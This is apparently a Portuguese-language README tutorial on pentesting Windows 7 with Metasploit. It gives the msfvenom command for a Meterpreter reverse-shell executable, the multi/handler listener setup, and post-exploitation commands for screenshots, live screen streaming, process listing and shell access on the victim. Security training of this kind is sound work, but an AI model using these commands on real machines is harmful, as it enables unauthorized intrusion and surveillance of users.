# win7pentest
Pentest básico no windows 7 - Metasploit2 


Pentest em Windows 7
Payloads / Invadindo Windows 7 com Metasploit
O Metasploit possui um componente chamado msfvenom, que é utilizado para gerar diversos payloads, convertendo-os em executáveis para diferentes plataformas e arquiteturas.



Gerando o Payload com msfvenom
O comando abaixo foi utilizado para criar um payload para Windows 7:

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<ip_local> LPORT=<porta> -f exe -o payload.exe



Explicação dos parâmetros:

-a : Especifica a arquitetura (x86 neste caso).
--platform : Define a plataforma alvo (Windows).
-p : Especifica o payload que será utilizado, neste caso o reverse_tcp do Meterpreter.
LHOST : O IP da máquina atacante (localhost).
LPORT : A porta de conexão (ex: 443).
-f : Formato do arquivo gerado (neste caso, .exe).
-o : Define o nome do arquivo de saída.
Exemplo de execução do comando


  <img src="img/img01.png">
  

Após gerar o payload, transferimos o arquivo para o Windows 7.

Configurando o Listener no Metasploit
Agora precisamos escutar a conexão da vítima. Para isso, voltamos ao msfconsole e utilizamos o módulo exploit/multi/handler:


use exploit/multi/handler
Explicação:

multi : Refere-se a múltiplas plataformas.
handler : Cria um listener para escutar as conexões.
Vamos configurar o payload para escutar as conexões reversas usando o Meterpreter:

set payload windows/meterpreter/reverse_tcp
Exemplo de configuração 

  <img src="img/img02.png">


Definindo LHOST e LPORT
Agora, configuramos o LHOST (IP da máquina atacante) e o LPORT (porta utilizada no ataque):

set lhost <ip_local>
set lport 443
Nota: A porta 443 foi utilizada aqui, mas poderíamos usar outra, como 80. Porém, portas comuns podem gerar conflitos se houver servidores rodando, ou serem bloqueadas pelo firewall.

Exemplo de configuração 

  <img src="img/img03.png">


Verificando as Informações do Payload
Podemos verificar as informações do payload inserindo o caminho do arquivo:

Exemplo de verificação do payload


  <img src="img/img04.png">


Executando o Payload no Windows 7
Agora, basta executar o payload no Windows 7 e observar o resultado no Kali. Para iniciar a exploração, utilizamos o comando:

exploit
Exemplo da execução do exploit 

  <img src="img/img05.png">


Executando Comandos no Meterpreter
Após a execução bem-sucedida do payload, temos acesso ao Meterpreter e podemos começar a interagir com a máquina alvo. Por exemplo:

Tirar screenshot da tela da vítima:

Exemplo de comando e resultado 

  <img src="img/img01.png">


  <img src="img/img07.png">


Identificar o usuário conectado:
getuid
Listar os processos ativos no Windows 7:
Exemplo de listagem de processos 

  <img src="img/img08.png">


Fazer uma transmissão ao vivo da tela com o comando screenshare:
Exemplo de comando e transmissão 


  <img src="img/img09.png">



  <img src="img/img10.png">



Escalando Privilégios
Embora seja possível tentar a escalação de privilégios usando o Meterpreter, o UAC (User Account Control) do Windows 7 pode impedir o sucesso. No entanto, em versões mais antigas como o Windows XP, isso pode funcionar sem problemas.

Utilizando o comando shell no Meterpreter, conseguimos acessar o cmd da máquina:

Exemplo do acesso ao shell:

  <img src="img/img11.png">

